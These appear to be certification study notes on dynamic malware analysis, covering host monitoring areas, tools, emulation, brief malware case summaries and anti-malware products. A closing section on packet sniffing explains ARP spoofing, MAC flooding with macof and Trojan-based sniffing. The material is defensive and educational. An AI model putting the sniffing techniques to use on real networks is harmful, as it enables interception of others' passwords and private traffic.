					- In malware analysis, host integrity monitoring helps to understand the runtime behavior of a malware file, including its activities, propagation techniques, URLs accessed, downloads initiated, and other actions it performs. This process detects changes made to the system's entities, such as files, processes, or configurations, during the analysis.
					- Host Integrity Monitoring includes the following:
						- Port Monitoring:
							- Malware programs compromise the system and open input/output ports to establish connections with remote systems, networks, or servers to carry out various malicious activities. These open ports can also serve as backdoors for other harmful malware or programs. Open ports act as communication channels, allowing malware to connect back to its handlers by opening unused ports on the victim's machine. Scanning for suspicious ports can help identify such malware.
							- During dynamic analysis, malware activity can be monitored for attempts to access particular ports using port monitoring tools like TCPView or command-line utilities such as netstat. These tools provide details such as the protocol used, local and remote addresses, and the connection's state. Additional information, such as process name, process ID, and remote connection protocol, may also be available. Port monitoring tools should be used to scan for suspicious ports and check for connections to unknown or suspicious IP addresses.
							- Port Monitoring Tools:
								- Netstat : It displays active TCP connections, ports on which the computer is listening, Ethernet statistics, the IP routing table, IPv4 statistics (for IP, ICMP, TCP, and UDP protocols), and IPv6 statistics (for IPv6, ICMPv6, TCP over IPv6, and UDP over IPv6 protocols). When used without parameters, netstat displays only active TCP connections.
								- TCPView : TCPView is a Windows program that provides detailed listings of all TCP and UDP endpoints on the system, including local and remote addresses, as well as the state of TCP connections. It offers a subset of the netstat program that comes with Windows. The TCPView download also includes Tcpvcon, a command-line version with the same functionality. When TCPView is run, it enumerates all active TCP and UDP endpoints, resolving IP addresses to their domain name equivalents.
								- CurrPorts (www.nirsoft.net)
								- TCP Port/Telnet Monitoring (www.dotcom-monitor.com)
								- PRTG's Network Monitor (www.paessler.com)
								- SolarWinds Open Port Scanner (www.solarwinds.com)
						- Process Monitoring:
							- Malware can enter a system through images, music files, videos, and other files downloaded from the Internet. It often disguises itself as legitimate Windows services and hides its processes to avoid detection. Some malware uses Portable Executable (PE) files to inject itself into various processes (such as explorer.exe or web browsers). While these malicious processes are visible, they appear legitimate, allowing them to bypass desktop firewalls. Attackers may use rootkit techniques to conceal malware, making it harder for antivirus software to detect.
							- Process monitoring is crucial for understanding the processes initiated by malware and the ones it takes over after execution. It is also important to monitor child processes, associated handles, loaded libraries, functions, and the execution flow of boot-time processes to fully define the nature of a file or program. By gathering information on processes running before and after malware execution, and comparing them, analysts can more quickly identify all the processes that malware starts. Using process-monitoring tools such as Process Monitor helps in detecting suspicious processes and speeding up the analysis.
							- Process Monitoring Tools:
								- Process Monitor : Process Monitor is a Windows monitoring tool that displays real-time file system, registry, and process/thread activity. It combines the functionality of two legacy Sysinternals utilities, Filemon and Regmon, while adding several enhancements, including advanced and non-destructive filtering, comprehensive event properties (such as session IDs and usernames), reliable process information, full thread stacks with integrated symbol support for each operation, and the ability to log events simultaneously to a file. These unique features make Process Monitor an essential tool in system troubleshooting and malware analysis toolkits.
								- Process Explorer (learn.microsoft.com)
								- OpManager (www.manageengine.com)
								- Monit (mmonit.com)
								- ESET SysInspector (www.eset.com)
								- System Explorer (systemexplorer.net)
						- Windows Registry Monitoring:
							- The Windows registry stores operating system and program configuration details, including settings and options. If the malware is a program, its functionality may also be stored in the registry. Malware often leverages the registry to persistently perform harmful activities by creating entries that ensure the malicious program runs automatically whenever the computer or device boots.
							- Windows automatically executes instructions in specific sections of the registry, including:
								- Run
								- RunServices
								- RunOnce
								- RunServicesOnce
								- HKEY_CLASSES_ROOT\exefile\shell\open\command ("%1" %*)
							- Malware often inserts instructions in these sections to carry out malicious activities. A solid understanding of the Windows registry, its structure, and its inner workings is essential for analyzing potential malware. Scanning for suspicious registry entries can aid in detecting malware infections. Tools like RegScanner can be used to examine registry values for any entries that appear suspicious or indicative of a malware infection.
							- To detect and analyze changes made by malware to the system registry, use registry monitoring tools such as jv16 PowerTools.
							- Registry Monitoring Tools:
								- jv16 PowerTools : jv16 PowerTools is a PC system utility software designed to optimize system by removing unnecessary files and data, cleaning the Windows registry, automatically fixing system errors, and improving overall performance. It includes features for scanning and monitoring the registry, which can help detect malicious registry entries created by malware. The "Clean and Speed Up My Computer" feature in the Registry Cleaner is specifically designed to fix registry errors, resolve system issues, and remove registry leftovers, as well as unnecessary files like old log files and temporary files. It serves as a powerful registry cleaner for identifying registry errors and eliminating unneeded registry junk.
								- Reg Organizer (www.chemtable.com)
								- Registry Viewer (www.exterro.com)
								- RegScanner (www.nirsoft.net)
								- Registry Monitoring Tool (www.solarwinds.com)
								- regshot (sourceforge.net)
						- Windows Services Monitoring:
							- Attackers design malware and other malicious code to install and run on a computer as services. Since most services operate in the background to support processes and applications, malicious services can remain hidden while performing harmful activities without user intervention or input.
							- Malware often spawns Windows services to enable attackers to remotely control the victim’s machine and execute malicious instructions. To avoid detection, malware may disguise its processes by renaming them to resemble legitimate Windows services. Additionally, malware can use rootkit techniques to manipulate registry keys, such as HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services, to hide its processes and services.
							- These malicious services often run under privileged accounts, such as the SYSTEM account, granting them greater access than standard user accounts and making them more dangerous than typical malware or executable files. Attackers further conceal their actions by naming malicious services similarly to legitimate Windows services.
							- To identify and trace malicious services initiated by malware during dynamic analysis, use Windows service monitoring tools like Windows Service Manager (SrvMan). These tools detect service changes and scan for suspicious Windows services.
							- Windows Service Monitoring Tools:
								- Windows Service Manager (SrvMan):
									- SrvMan offers both GUI and command-line modes. It can also run arbitrary Win32 applications as services, automatically closing the main application window when the service is stopped.
									- SrvMan's command-line interface can be used to perform the following tasks:
										- Create services
										- Delete services
										- Start, stop, or restart services
										- Install and start a legacy driver with a single command
								- Netwrix Service Monitor (www.netwrix.com)
								- AnVir Task Manager (www.anvir.com)
								- Service+ (www.activeplus.com)
								- Advanced Windows Service Manager (securityxploded.com)
								- Process Hacker (processhacker.sourceforge.io)
						- Startup Programs Monitoring:
							- Malware can modify system settings and add itself to the startup menu, enabling malicious activities each time the system starts. Therefore, it is essential to scan for suspicious startup programs manually or use startup monitoring tools, such as Autoruns for Windows, to detect malware effectively.
							- Manually Detect Hidden Malware:
								- Check Startup Program Entries in the Registry:
									- Startup items, including programs, shortcuts, folders, and drivers, are configured to run automatically when users log into a Windows operating system (e.g., Windows 11). These items can be added by installed programs or drivers, or manually by the user. Programs configured to run at Windows 11 startup can be found in specific registry entries, such as the Windows startup settings, Explorer startup settings, and Internet Explorer (IE) startup settings.
									- Windows Startup Setting
									- Explorer Startup Setting
									- Microsoft Edge Startup Settings
								- Check Automatically Loaded Device Drivers:
									- Navigate to C:\Windows\System32\drivers to review the device drivers automatically loaded by the system.
								- Check boot.ini or BCD (Boot Manager) Entries:
									- Open Command Prompt with administrative privileges
									- Type bcdedit and press Enter
									- This will display all the boot manager entries
								- Check Windows Services That Start Automatically:
									- Open the Run dialog by pressing Win + R
									- Type services.msc and press Enter
									- In the Services window, sort the services by Startup Type to view the list of services configured to start automatically when the system boots.
								- Check the Startup Folder:
									- Startup folders contain applications or shortcuts to applications that are configured to run automatically when the system boots. To check the startup applications in Windows 11, examine the following locations:
										- C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
										- C:\Users\(User-Name)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
									- Another method to access the startup folders:
										- Press Windows + R to open the Run dialog box.
										- Type shell:startup and click OK to navigate directly to the startup folder.
							- Startup Program Monitoring Tool:
								- Autoruns for Windows:
									- This utility can identify the location of any startup monitor, display the programs configured to run during system bootup or login, and show the entries in the order that Windows processes them. Once a program is included in the startup folder, Run, RunOnce, or other registry keys, users can configure Autoruns to display additional locations, such as Explorer shell extensions, toolbars, browser helper objects, Winlogon notifications, and auto-start services.
									- The Hide Signed Microsoft Entries option in Autoruns helps users focus on third-party auto-start items added to their system. It also provides support for reviewing auto-start entries configured for other user accounts on the system.
								- WinPatrol (www.bleepingcomputer.com)
								- Autorun Organizer (www.chemtable.com)
								- Quick Startup (www.glarysoft.com)
								- StartEd Pro (www.outertech.com)
								- Chameleon Startup Manager (www.chameleon-managers.com)
						- Event Logs Monitoring/Analysis:
							- Log analysis involves examining computer-generated records or activities to identify malicious or suspicious events. This process provides detailed information about activities or events, which can reveal possible attacks, such as Trojans or worms in the system. It serves as a vital source of information for identifying security gaps and detecting threats.
							- Log analysis can uncover zero-day backdoor Trojans or other potential attacks, such as failed authentication or login attempts, by analyzing logs from various components. Logs from security-critical components, including firewall systems, IDS/IPS, web servers, and authentication servers, are particularly valuable. They often contain details such as file types, ports, timestamps, and registry entries.
							- In Windows, system logs, application logs, access logs, audit logs, and security logs can be analyzed using the Event Viewer under the Windows Logs section. To streamline the process, use log analysis tools like Splunk to identify suspicious logs or events with malicious intent.
							- Locating System Logs:
								- System Logs: Start -> Event Viewer -> Windows Logs
								- System Security Logs: Start -> Event Viewer -> Windows Logs -> Security
								- Applications and Services Logs: Start -> Event Viewer -> Applications and Services Logs
							- Log Monitoring/Analysis Tools:
								- Splunk : It is an SIEM tool that automatically collects event logs from all systems within a network. To enable monitoring, Splunk forwarders must be installed on all systems in the network. These forwarders transfer real-time event logs from the network systems to the central Splunk dashboard.
								- ManageEngine Event Log Analyzer (www.manageengine.com)
								- Solarwinds Loggly (www.loggly.com)
								- Netwrix Event Log Manager (www.netwrix.com)
								- New Relic (newrelic.com)
						- Installation Monitoring:
							- When a system or user installs or uninstalls a software application, traces of the application data may remain on the system. To identify these traces, it is essential to know which folders were modified or created during the installation process, as well as files and folders that were not removed by the uninstallation process.
							- Installation monitoring is useful for detecting hidden or background installations carried out by malware. Tools such as SysAnalyzer can be used to monitor the installation of malicious executables and help identify suspicious activity.
							- Installation Monitoring Tools:
								- Mirekusoft Install Monitor : Mirekusoft Install Monitor automatically tracks what is placed on a system and allows for complete uninstallation. It monitors resources such as files and registry entries created during program installation and provides detailed information about installed software. Additionally, it determines the disk, CPU, and memory consumption of programs and tracks how frequently different programs are used. A program tree is included as a useful feature to show which programs were installed together.
								- Advanced Uninstaller PRO (www.advanceduninstaller.com)
								- REVO UNINSTALLER PRO (www.revouninstaller.com)
								- Comodo Programs Manager (www.comodo.com)
						- Files and Folders Monitoring:
							- Malware programs often modify system files and folders after infecting a computer. They may alter these files and folders to store information, making it important to identify and analyze them to uncover any relevant data. These files and folders may also contain hidden program code or malicious strings, which the malware could execute on a specified schedule.
							- To detect changes in system files and folders, use file and folder integrity checkers such as PA File Sight, Tripwire, and Netwrix Auditor. These tools can also help identify suspicious files and folders, detect Trojans, and monitor system file modifications.
							- File and Folder Integrity Checking Tools:
								- PA File Sight : PA File Sight is a protection and auditing tool designed to detect and prevent malicious activities, including ransomware attacks originating from the network. It blocks compromised computers from accessing files on other protected servers and detects users copying files, with an option to block such access. The tool provides real-time alerts, enabling immediate investigation by appropriate staff, and monitors file activities such as deleting, moving, or reading files.
								- Tripwire File Integrity Monitoring (www.tripwire.com)
								- Netwrix Auditor (www.netwrix.com)
								- Verisys Integrity Suite (www.ionxsolutions.com)
								- CSP File Integrity Checker (www.cspsecurity.com)
								- NNT Change Tracker (www.newnettechnologies.com)
						- Device Drivers Monitoring:
							- Malware can be installed on a system alongside device drivers downloaded from untrusted sources, with attackers using these drivers as a shield to evade detection. To identify suspicious device drivers, driver monitoring tools such as DriverView and Driver Detective can be used to scan and verify their authenticity and ensure they were downloaded from the publisher’s original site (legitimacy).
							- Windows System Drivers Path: Go to Run -> Type msinfo32 and Enter -> Software Environment -> System Drivers
							- Device Driver Monitoring Tools:
								- DriverView : The DriverView utility displays a list of all device drivers currently loaded on the system, along with details such as the driver's load address, description, version, product name, and manufacturer.
								- Driver Booster (www.iobit.com)
								- Driver Reviver (www.reviversoft.com)
								- Driver Easy (www.drivereasy.com)
								- Driver Fusion (treexy.com)
								- Driver Genius (www.driver-soft.com)
						- Network Traffic Monitoring/Analysis:
							- Network analysis is the process of capturing and carefully examining network traffic to identify malware activity. It helps determine the type of traffic, network packets, or data transmitted across the network. Malware often relies on the network for activities such as propagation, downloading malicious content, transmitting sensitive information, and enabling remote control by attackers. Some malware connects back to its handlers and sends confidential information.
							- To monitor network traffic directed to malicious remote addresses, use network scanners and packet sniffers. Network monitoring tools such as SolarWinds NetFlow Traffic Analyzer, Capsa Network Analyzer, and Wireshark can be used to capture live network traffic to and from the victim’s system during the execution of suspicious programs. This helps in understanding the malware’s network artifacts, signatures, functions, and other characteristics.
							- Network Activity Monitoring Tools:
								- SolarWinds NetFlow Traffic Analyzer : NetFlow Traffic Analyzer collects traffic data, converts it into a usable format, and presents it to the user through a web-based interface for easy monitoring of network traffic. It offers features such as network traffic analysis, bandwidth monitoring, application traffic alerting, performance analysis, CBQoS policy optimization, and the identification of malicious or malformed traffic flows to enhance network performance and security.
								- Caspa Network Analyzer (www.colasoft.com)
								- Wireshark (www.wireshark.org)
								- PRTG Network Monitor (kb.paessler.com)
								- GFI LanGuard (www.gfi.com)
								- insightIDR (www.rapid7.com)
						- DNS Monitoring/Resolution:
							- DNSChanger is a malicious software capable of altering the system's DNS server settings, giving attackers control over the DNS server used on the victim’s system.
							- Use DNS monitoring tools such as DNSQuerySniffer and DNSstuff to verify the DNS servers the malware attempts to connect to and identify the type of connection. Attackers can then control the websites the user attempts to access, redirect them to fraudulent sites, or interfere with their online browsing activities.
							- DNS Monitoring/Resolution Tools:
								- DNSQuerySniffer : DNSQuerySniffer is a network sniffer utility that displays DNS queries sent from system. For each DNS query, it shows the following information: host name, port number, query ID, request type (A, AAAA, NS, MX, etc.), request time, response time, duration, response code, number of records, and the content of the returned DNS records.
								- DNSstuff (www.dnsstuff.com)
								- UltraDNS (vercara.com)
								- Sonar Lite Web App (constellix.com)
								- DNSCheck.co (www.dnscheck.co)
								- Dotcom-Monitor (www.dotcom-monitor.com)
						- API Calls Monitoring:
							- Application Programming Interfaces (APIs) are components of the Windows OS that allow external applications to access OS information, such as file systems, threads, errors, the registry, kernel, buttons, mouse pointers, network services, web, and the Internet. Malware programs exploit these APIs to access OS information and damage the system.
							- To understand how malware interacts with the OS and the activities it performs, it's important to gather and analyze the APIs related to the malware. Tools such as API Monitor can be used to monitor API calls made by applications.
							- API Call Monitoring Tools:
								- API Monitor : API Monitor is a software tool that allows to monitor and display Win32 API calls made by applications. It can trace any exported API and provides a wide range of information, including the function name, call sequence, input and output parameters, function return values, and more. It is a valuable tool for developers to understand how Win32 applications operate and to learn their behaviors.
								- API Call Monitoring (apicontext.com)
								- Runscope (www.runscope.com)
								- AlertSite (smartbear.com)
						- System Calls Monitoring:
							- Syscalls (system calls) serve as an interface between an application and the kernel, providing a way for processes activated by the OS to request specific resources. System calls are generated by an application or program when it requires access to system resources. These calls are typically triggered during context switching between user mode and kernel mode.
							- Monitoring system calls is essential for detecting malware and understanding its behavior. It can also help identify the type of damage caused by malware to the system. Tools such as strace can be used to view or trace system calls in a Linux environment.
							- System Calls Monitoring Tools:
								- strace : The strace tool intercepts and records the system calls made by a process, as well as the signals received by the process. It prints the name of each system call, its arguments, and its return value to standard error or to a file specified using the -o option.
									- Attaching the strace tool to the active process: strace -p <ProcessID>
									- View only system calls accessing a specific or given path: strace -P <given_path> ls /var/empty
									- Count time, calls, and errors for each system call: strace -c ls > /dev/null
									- Extract system calls and save the output in text file: strace -o out.txt ./<sample file>
						- Scheduled Tasks Monitoring:
							- Malware can use time-based or action-based triggers as scheduled tasks. Attackers design malware to remain inactive until a specific date or event triggers its execution using Windows Task Scheduler. To detect such malware, it’s essential to check for scheduled tasks, such as logic bombs, which can execute under different triggers. Command-line tools like schtasks and Windows Task Scheduler can display a list of all system scheduled tasks. Additionally, ADAudit Plus can help detect suspicious scheduled tasks.
							- Windows Scheduled Task Monitoring Tools:
								- ADAudit Plus (www.manageengine.com)
								- CronitorCLI (cronitor.io)
								- SolarWinds Windows Scheduled Task Monitor (www.solarwinds.com)
						- Browser Activity Monitoring:
							- Malware can exploit browsers to connect with C&C servers, malicious websites, and other DNS servers to download harmful files. It is essential to inspect suspicious browsing activities to identify malicious traffic and system vulnerabilities. Since browsers typically use ports 80, 443, or 8080 to connect to C&C servers, checking for any unusual activity occurring through these ports is crucial.
							- Additionally, web caches can be examined, web access at firewalls monitored, and web traffic filtered by URL and malicious strings found in web logs. Network monitoring tools such as Wireshark and Colasoft Portable Network Analyzer can be used to analyze browsing activities.
							- Monitoring Tools:
								- Wireshark : Wireshark is a widely used network protocol analyzer capable of capturing real-time browser traffic passing through a network. It sorts the captured traffic using filters, enabling analysts to identify malicious communication with C&C servers and malicious IP addresses.
								- Colasoft Portable Network Analyzer (www.colasoft.com)
								- OmniPeek (www.liveaction.com)
								- Observer Analyzer (www.viavisolutions.com)
								- PRTG Network Monitor (www.paessler.com)
								- NetFlow Analyzer (www.manageengine.com)
	- Supporting Tools for Malware Analysis:
		- Virtual Machines Tools:
			- VirtualBox
			- VMware Workstation
			- Microsoft Hyper-V
			- Parallels® Desktop
			- Boot Camp
		- Screen Capture and Recording Tools:
			- Snagit
			- TechSmith Capture
			- Camtasia
			- Ezvid
		- Network and Internet Simulation Tools:
			- NetSim Professional
			- ns-3
			- Riverbed Modeler
			- GNS3
		- OS Backup and Imaging Tools:
			- Genie Backup Manager Pro
			- Macrium Reflect Server
			- R-Drive Image
			- O&O DiskImage 18 Server
	- Virus Detection Methods:
		- Scanning:
			- A virus scanner is essential software for detecting and preventing viruses. Without a scanner, the system is highly susceptible to virus attacks. Antivirus tools should run continuously and be updated regularly to keep the scan engine and virus signature database current.
			- Virus writers often modify existing viruses to create new variants, aiming to evade detection. To counter this, modern scanners use advanced techniques like code analysis, examining various parts of executable files to enhance virus recognition.
		- Integrity checking:
			- Integrity-checking products function by reading and recording integrated data to develop a signature or baseline for files and system sectors. However, a limitation of basic integrity checkers is their inability to distinguish between file corruption caused by bugs and that caused by viruses. To address this, some integrity checkers combine antivirus techniques with integrity checking, creating a hybrid tool.
		- Interception:
			- The primary objective of an interceptor is to deflect logic bombs and Trojans. It achieves this by monitoring and controlling requests to the operating system for network access or actions that could threaten programs. When such a request is detected, the interceptor prompts the user to decide whether to allow it.
			- However, there is no reliable method to intercept direct branches to low-level code or direct input/output instructions executed by a virus. Additionally, some viruses are capable of disabling the monitoring program itself, further complicating detection and prevention.
		- Code Emulation:
			- Code emulation allows antivirus software to use a virtual machine to simulate CPU and memory activities. In this process, the virus code is executed within the virtual machine rather than the actual processor. This approach is particularly effective against encrypted and polymorphic viruses. Over time, the decrypted virus body is exposed and can be detected by the scanner. Code emulation can also identify metamorphic viruses, whether they use single or multiple encryption layers.
			- However, a drawback of code emulation is its inefficiency when dealing with viruses that have very long decryption loops, as the process becomes significantly slower.
		- Heuristic Analysis:
			- This method aids in detecting new or unknown viruses, often variants of an existing virus family. Heuristic analysis can be either static or dynamic. In static analysis, the antivirus tool examines the file format and code structure to assess whether the code is malicious. In dynamic analysis, the antivirus tool emulates the execution of suspicious code to determine its behavior.
			- A major drawback of heuristic analysis is its susceptibility to false positives, where benign code is incorrectly identified as malicious. This can lead users to mistrust positive test results, potentially dismissing a real threat as a false alarm.
	- Malware Code Emulation:
		- Malware code emulation is a technique used to perform static or dynamic malware analysis on suspected malware samples. It creates an isolated virtual environment to execute a malware sample by mimicking its hardware and software requirements without interrupting its actual functionality. This method allows for thorough examination without compromising the host system.
		- Unlike sandboxing, which uses an isolated environment with a real operating system to run malware samples for behavior analysis, code emulation temporarily simulates components such as processors, memory, hard disks, network devices, operating systems, antivirus software, and system registries. This approach enables greater control over the malware's execution and provides more flexibility in the analysis.
		- Malware emulators offer the ability to set breakpoints to pause execution, allowing the malware to bypass anti-malware techniques. They can emulate and run malware on multiple operating systems, requiring fewer resources than sandboxes. Additionally, emulators can operate on any host system, making them a versatile tool for malware analysis.
		- Malware Code Emulator Tools:
			- SCEMU : SCEMU is an x86 32/64-bit emulator designed to securely emulate malware. It includes all necessary dependencies and contains no unsafe blocks. SCEMU can execute up to 2,000,000 instructions per second, utilizing the iced-x86 Rust Disassembler Library. Additionally, it supports known Metasploit payloads, such as shellcodes and encoders. SCEMU visualizes the output in a colorized format and allows users to pause execution at any point to explore the system's state.
			- Unicorn
			- QEMU
			- Windows_Malware_Emulator
			- Speakeasy
			- Kaspersky Lab Emulator
	- Malware Code Instrumentation:
		- Malware code instrumentation is a technique used in cybersecurity to analyze and understand the behavior of malicious software by injecting additional code or instructions at specific points within the binary code. These instructions enable the capture of critical events or actions performed by malware during execution, such as logging function calls, tracking memory allocations, monitoring network communications, and recording file system interactions in real time.
		- Analysts can then examine the collected data to gain insights into the malware's behavior, attack techniques, capabilities, and intent, which can help in developing effective countermeasures to mitigate the threats posed by the malware.
		- However, malware code instrumentation is a challenging process due to the complexity of analyzing and modifying binary code, and attackers may employ anti-analysis techniques to evade detection and thwart instrumentation efforts. Tools like Frida and HawkEye can be used to perform code instrumentation.
		- Code Instrumentation Tools:
			- HawkEye : HawkEye is a dynamic malware instrumentation tool based on the frida.re framework. It allows to hook common functions to log malware activities and output the results in a well-organized webpage report. HawkEye can run in two modes: spawning a malware sample in a new process by providing its path, or hooking a running process using its PID.
			- Frida
	- Trojan Analysis: Coyote:
		- Attackers have developed “Coyote,” a sophisticated banking Trojan with advanced evasion techniques to bypass security and steal financial data from internet banking users. Unlike traditional malware using Delphi or MSI installers, Coyote employs the Squirrel installer for Windows applications and uses Nim as its cross-platform loader.
	- Virus Analysis: GhostLocker 2.0:
		- GhostLocker 2.0, developed by the GhostSec hacktivist group, is an updated ransomware written in Golang with advanced tools for tracking payouts and campaigns. It spreads via compromised software supply chains and vulnerable RDP configurations, enabling lateral movement and data encryption. GhostLocker 2.0 uses double extortion, demanding ransoms while threatening to leak sensitive data. In November 2023, GhostSec announced this update and hinted at developing GhostLocker V3.
	- Fileless Malware Analysis: PyLoose:
		- PyLoose is a Python-based fileless malware designed to target cloud workloads for long-term cryptomining. It injects malicious Python code and uses memfd to load an XMRig miner directly into system memory, making it undetectable by antivirus solutions. The malware was first identified in mid-2023 using the Wiz Runtime Sensor.
	- AI-based Malware Analysis: FakeGPT:
		- In February 2023, a sophisticated malware campaign called FakeGPT was discovered, exploiting ChatGPT’s popularity to distribute a malicious Chrome extension named "Quick Access to Chat GPT." The extension provided access to a fake ChatGPT platform designed to compromise Facebook accounts. It installed a covert Facebook app backdoor, granting attackers super-admin rights to high-profile business accounts. This allowed them to build a botnet and a malicious advertising mechanism, using victims’ resources to spread paid ads in a self-replicating, wormlike manner.
	- Anti-Malware Software:
		- Anti-Trojan Software:
			- Avast One (www.avast.com)
			- Bitdefender Total Security (www.bitdefender.com)
			- Panda Dome (www.pandasecurity.com)
			- NortonTM 360 (us.norton.com)
			- G DATA Total Security (www.gdatasoftware.com)
			- TotalAV (www.totalav.com)
			- Surfshark Antivirus (surfshark.com)
			- NordVPN Threat Protection (nordvpn.com)
			- Sophos (www.sophos.com)
			- Trend Micro Maximum Security (www.trendmicro.com)
			- Malwarebytes (www.malwarebytes.com) 
			- Avira (www.avira.com)
			- Emsisoft Anti-Malware Home (www.emsisoft.com) 
			- HitmanPro (www.hitmanpro.com)
		- Antivirus Software:
			- McAfee® Total Protection (www.mcafee.com)
			- Kaspersky Anti-Virus (www.kaspersky.com)
			- Norton AntiVirus Plus (us.norton.com)
			- Bitdefender Antivirus Plus (www.bitdefender.com)
			- Avast Premier Antivirus (www.avast.com)
			- Intego (www.intego.com)
			- TotalAV Antivirus Pro (www.totalav.com)
			- Webroot SecureAnywhere Antivirus (www.webroot.com)
			- ESET Internet Security (www.eset.com)
			- Avira Antivirus Pro (www.avira.com)
			- Panda Total protection (www.pandasecurity.com)
		- Fileless Malware Detection Tools:
			- Cynet Next-Gen Antivirus (NGAV) (www.cynet.com)
			- Apex One (www.trendmicro.com)
			- Cortex XDR (www.paloaltonetworks.com)
			- ManageEngine Next-Gen Antivirus (NGAV) (www.manageengine.com)
			- Kaspersky Total Security (www.kaspersky.com)
			- Xcitium Advanced (EPP+EDR) (www.xcitium.com)
		- Fileless Malware Protection Tools:
			- Microsoft Defender for Endpoint (www.microsoft.com)
			- FortiEDR (www.fortinet.com)
			- Kaspersky End Point Security for Business (www.kaspersky.com)
			- Sophos Intercept X (www.sophos.com)
			- CylanceENDPOINTTM (www.blackberry.com)
			- IBM Security QRadar EDR (www.ibm.com)
		- AI-Powered Malware Detection and Analysis Tools:
			- Malware.AI (www.malware.ai)
			- Sophos Intercept X (www.sophos.com)
			- Elastic Security (www.elastic.co)
			- Bitdefender GravityZone (www.bitdefender.com)
			- Vipre Endpoint Security (vipre.com)
			- Webroot SecureAnywhere (www.webroot.com)
		- Endpoint Detection and Response (EDR/XDR) Tools:
			- CrowdStrike Falcon® Insight XDR (www.crowdstrike.com)
			- Microsoft Defender for Endpoint (www.microsoft.com)
			- Tanium Endpoint Management (www.tanium.com)
			- Cisco XDR (www.cisco.com)
			- Trellix Endpoint Security (ENS) (www.trellix.com)
			- VMware Carbon Black (www.vmware.com)


--------------------------------------------------

# Sniffing

- Network/Packet Sniffing
	- Packet sniffing is the process of monitoring and capturing data packets that pass through a network, typically using specialized software or hardware tools. Packet sniffers can intercept packets containing sensitive information such as passwords, account details, syslog traffic, router configurations, DNS queries, email traffic, web traffic, chat sessions, and FTP credentials. This enables an attacker to read cleartext passwords, view actual emails, and access sensitive data such as credit card numbers and financial transactions.
	- Packet sniffing can also capture traffic from protocols like SMTP, POP, IMAP, HTTP Basic authentication, Telnet, SQL databases, SMB, NFS, and FTP. By analyzing the captured data, an attacker can gather valuable information to compromise the network. Additionally, attackers can enhance the effectiveness of their attacks by combining packet sniffing with active transmission techniques.
	- Sniffing is easier in hub-based networks, where traffic is broadcast to all connected hosts. In modern switch-based networks, a switch forwards data only to the port associated with the destination MAC address, unlike a hub, which sends data to all ports. To capture traffic on a switch, attackers must manipulate its functionality. A packet sniffer in promiscuous mode can bypass Ethernet NIC filters to capture and analyze all traffic on a subnet, although it cannot access packets from other networks.
	- Despite widespread use of switches, sniffing remains effective. Open switch ports in many networks allow devices to connect and access traffic. Attackers can also install remote sniffing tools on high-traffic components like servers and routers, enabling them to monitor and capture network traffic from a single point.
	- Working of Sniffer:
		- The most common way to network computers is through an Ethernet connection. A computer connected to a local area network (LAN) has two types of addresses: a MAC address and an Internet Protocol (IP) address. The MAC address uniquely identifies each device in the network and is stored on the NIC (Network Interface Card). Ethernet uses the MAC address to transfer data by incorporating it into data frames. At the data link layer of the OSI model, an Ethernet header uses the MAC address of the destination machine rather than the IP address.
		- The network layer handles mapping IP addresses to MAC addresses, as required by the data link protocol. It first checks the Address Resolution Protocol (ARP) cache, a table that stores mappings of IP addresses to MAC addresses. If no entry exists for the destination IP address, an ARP broadcast request is sent to all devices on the local subnet. The device with the matching IP address responds with its MAC address, which is then added to the source machine’s ARP cache. Subsequent communications between the source and destination machines use the cached MAC address.
		- There are two basic types of Ethernet environments, and sniffers operate differently in each:
			- Shared Ethernet:
				- In a shared Ethernet environment, all hosts are connected to a single bus and compete for bandwidth. When one machine (e.g., machine 1) communicates with another (e.g., machine 2), it sends a packet onto the network with the destination MAC address of machine 2 and its own source MAC address. Other machines (e.g., machines 3 and 4) compare the frame's destination MAC address to their own and discard unmatched frames. However, a machine running a sniffer bypasses this rule and accepts all frames. Sniffing in a shared Ethernet environment is passive and therefore difficult to detect.
			- Switched Ethernet:
				- In a switched Ethernet environment, hosts are connected to a switch instead of a hub. The switch maintains a table that maps each computer's MAC address to the physical port it is connected to and forwards packets only to the intended recipient. Unlike a hub, a switch does not broadcast packets to all devices, resulting in better bandwidth utilization and enhanced security. Consequently, placing a NIC into promiscuous mode to capture packets is ineffective. This has led many to believe that switched networks are secure and immune to sniffing. However, this is not entirely true.
		- Network Sniffing Methods:
			- ARP Spoofing:
				- The Address Resolution Protocol (ARP) is stateless, meaning a machine can send an ARP reply without receiving a request, and other devices may accept such unsolicited replies. To sniff traffic from another system, a machine can perform ARP spoofing by impersonating the network gateway. This causes the target machine's ARP cache to store an incorrect entry for the gateway's MAC address. As a result, all traffic intended for the gateway is redirected to the machine that spoofed the gateway's MAC address.
			- MAC Flooding:
				- Switches maintain a translation table that maps MAC addresses to the physical ports on the switch, allowing them to intelligently route packets between hosts. However, switches have limited memory. MAC flooding exploits this limitation by overwhelming the switch with fake MAC addresses until it can no longer process them. When the switch's memory is exhausted, it enters fail-open mode, behaving like a hub by broadcasting packets to all ports. This makes it easier to perform sniffing. The tool macof, which is part of the dsniff suite, is commonly used by attackers to carry out MAC flooding.
			- When a switch operates as a hub, it broadcasts all packets to all network devices. Normally, NICs only accept packets addressed to them, as promiscuous mode is disabled by default. A sniffer enables promiscuous mode, allowing the NIC to capture all traffic on the network segment. Attackers exploit this by configuring their NICs in promiscuous mode to intercept and analyze all transmitted packets.
	- Types of Sniffing:
		- Passive Sniffing:
			- Passive sniffing does not involve sending packets; it simply captures and monitors packets flowing through the network. A packet sniffer alone is generally not preferred for attacks because it functions only within a common collision domain. A common collision domain refers to a network segment that is not switched or bridged, typically found in hub-based networks. In such environments, all hosts can see all network traffic, making it easy to capture data using passive sniffing.
			- Most modern networks use switches instead of hubs, which reduces the risk of passive sniffing. Passive sniffing offers significant stealth advantages compared to active sniffing, as it does not generate detectable traffic.
			- Passive Sniffing Methods (to gain control over target network):
				- Compromising Physical Security : An attacker who breaches the physical security of an organization can connect a laptop to the network to capture sensitive information.
				- Using a Trojan Horse : Many Trojans have built-in sniffing capabilities. An attacker can install a Trojan on a victim’s machine to compromise it and then deploy a packet sniffer to intercept network traffic.
		- Active Sniffing:
			- Active sniffing involves injecting traffic into a switched LAN to capture data. Unlike hub-based networks, switches do not broadcast packets to all systems, making passive sniffing ineffective. Active sniffing is harder to detect but can be achieved by injecting ARP traffic to intercept network data.
			- Switches maintain an ARP cache in Content Addressable Memory (CAM), mapping hosts to ports. A sniffer records visible network traffic, allowing attackers to view sensitive information. Active sniffing includes sending network probes to identify access points.
